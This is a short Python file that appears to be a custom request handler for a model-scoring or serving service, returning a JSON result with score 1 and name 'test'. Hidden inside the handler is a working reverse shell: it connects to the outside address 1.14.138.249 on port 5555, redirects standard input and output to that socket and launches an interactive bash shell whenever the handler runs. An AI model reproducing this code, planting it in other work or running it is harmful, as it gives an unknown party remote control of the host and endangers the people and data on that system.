import json
import socket,subprocess,os



def handle(req):
    # custom handler func by k

    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("1.14.138.249",5555))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/bash","-i"])
    model_result = {"score": 1, "name": "test"}

    params = {"model_result": model_result}

    resp = {"Params": params}

    return json.dumps(resp)



